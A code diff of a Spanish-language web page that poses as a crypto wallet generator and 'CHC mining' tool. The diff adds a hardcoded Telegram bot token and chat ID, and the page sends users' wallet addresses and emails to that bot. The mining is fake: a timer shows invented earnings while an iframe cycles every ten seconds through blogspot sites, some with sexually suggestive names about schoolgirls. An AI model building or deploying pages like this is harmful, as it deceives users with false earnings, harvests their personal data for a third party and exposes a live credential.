@@ -7,42 +7,40 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f9fafb;
+      background-color: #f4f4f9;
       color: #333;
       margin: 0;
-      padding: 20px;
+      padding: 0;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
     }
     .container {
-      width: 100%;
-      max-width: 500px;
+      width: 90%;
+      max-width: 600px;
       background-color: #ffffff;
       padding: 20px;
-      box-shadow: 0 6px 12px rgba(0,0,0,0.1);
-      border-radius: 12px;
+      margin-top: 20px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      border-radius: 10px;
     }
     h1 {
       color: #4CAF50;
       text-align: center;
-      margin-bottom: 20px;
     }
     input, button {
-      width: 100%;
+      width: calc(100% - 20px);
       padding: 12px;
-      margin-bottom: 12px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
       box-sizing: border-box;
-      font-size: 16px;
     }
     button {
       background-color: #4CAF50;
       color: white;
       cursor: pointer;
       transition: background 0.3s;
-      font-weight: bold;
     }
     button:hover {
       background-color: #45a049;
@@ -51,14 +49,14 @@
       width: 100%;
       height: 400px;
       border: none;
-      border-radius: 8px;
       margin-top: 20px;
     }
     #resultado {
       background-color: #e8f5e9;
-      padding: 12px;
+      padding: 10px;
+      margin-top: 10px;
       border: 1px solid #c8e6c9;
-      border-radius: 8px;
+      border-radius: 5px;
       word-wrap: break-word;
     }
   </style>
@@ -71,45 +69,70 @@
   <button onclick="generarBilletera()">Generar Billetera</button>
   <div id="resultado"></div>
 
+  <!-- Caja para ingresar billetera y correo -->
   <input type="text" id="wallet" placeholder="Introduce tu billetera Worldchain" />
   <input type="email" id="correo" placeholder="Introduce tu correo" />
   <button onclick="guardarDatos()">Guardar Datos</button>
   
   <button onclick="pararMineria()">Parar Minería</button>
-
+  
+  <!-- Marco para redirigir dentro de la página -->
   <iframe id="redireccionFrame" src=""></iframe>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<script>
-const telegramToken = process.env.TELEGRAM_TOKEN;
-const chatId = process.env.CHAT_ID;
 
+<script>
+let tiempoTotal = 0;
+let interval;
+let minando = true;
+const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
+const chatId = '7613604212';
+
+// URLs para redirección
 const urls = [
   "https://notiiciasmex.blogspot.com",
   "https://tareasunamyunadm.blogspot.com",
-  "https://faucentminialtcrypto.blogspot.com"
+  "https://faucentminialtcrypto.blogspot.com",
+  "https://solotareasmex.blogspot.com",
+  "https://colegialas-calientes-69.blogspot.com",
+  "https://colegialas14defebrero.blogspot.com",
+  "https://joseperez69.blogspot.com",
+  "https://mundogamermejico.blogspot.com",
+  "https://backtrackingchesscaso.blogspot.com",
+  "https://games2015steamyorigin.blogspot.com", 
+  "https://videoescandalosmex.blogspot.com",
+  "https://basededatosunadm.blogspot.com",
+  "https://gmcas77.blogspot.com",
+  "https://basededatostareas.blogspot.com"
 ];
 
-let minando = true;
-let tiempoTotal = 0;
-let interval;
-
+// Función para redirigir en el iframe
 function redireccionAleatoria() {
   if (!minando) return;
   const indiceAleatorio = Math.floor(Math.random() * urls.length);
-  document.getElementById('redireccionFrame').src = urls[indiceAleatorio];
+  const urlRedireccion = urls[indiceAleatorio];
+  
+  // Mostrar la página en el iframe
+  document.getElementById('redireccionFrame').src = urlRedireccion;
+
+  // Redirigir cada 10 segundos
   setTimeout(redireccionAleatoria, 10000);
 }
 
+// Iniciar la redirección al cargar la página
+redireccionAleatoria();
+
+// Función para generar una nueva billetera
 async function generarBilletera() {
-  const wallet = ethers.Wallet.createRandom();
-  document.getElementById('resultado').innerHTML = `
-      <p><strong>Dirección:</strong> ${wallet.address}</p>
-      <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
-  `;
+    const wallet = ethers.Wallet.createRandom();
+    document.getElementById('resultado').innerHTML = `
+        <p><strong>Dirección:</strong> ${wallet.address}</p>
+        <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
+    `;
 }
 
+// Función para guardar datos y enviarlos al bot de Telegram
 async function guardarDatos() {
   const wallet = document.getElementById('wallet').value;
   const correo = document.getElementById('correo').value;
@@ -121,32 +144,51 @@ async function guardarDatos() {
 
   const mensaje = `📲 *Nueva Wallet Generada*:\n\n🔑 Wallet: ${wallet}\n📧 Correo: ${correo}`;
   const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-
+  
   try {
     const response = await fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: 'Markdown' })
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: mensaje,
+        parse_mode: 'Markdown'
+      })
     });
 
-    if (response.ok) alert('Datos guardados correctamente.');
-    else alert('Error al enviar los datos.');
+    if (response.ok) {
+      alert('Datos guardados correctamente.');
+    } else {
+      alert('Error al enviar los datos al bot.');
+    }
   } catch (error) {
     console.error('Error:', error);
     alert('Error al enviar los datos.');
   }
 }
 
+// Función para contar el tiempo y minería de CHC
+function contarTiempo() {
+  if (minando) {
+    tiempoTotal++;
+    if (tiempoTotal % 100 === 0) {
+      alert(`¡Has ganado 100 CHC!`);
+    }
+  }
+}
+
+// Función para detener la minería
 function pararMineria() {
   clearInterval(interval);
   minando = false;
+  alert(`Has ganado ${tiempoTotal} CHC. Gracias por usar la página.`);
 }
 
-interval = setInterval(() => {
-  if (minando) tiempoTotal++;
-}, 1000);
-
-redireccionAleatoria();
+// Iniciar el conteo de tiempo
+interval = setInterval(contarTiempo, 1000);
 </script>
+
 </body>
 </html>
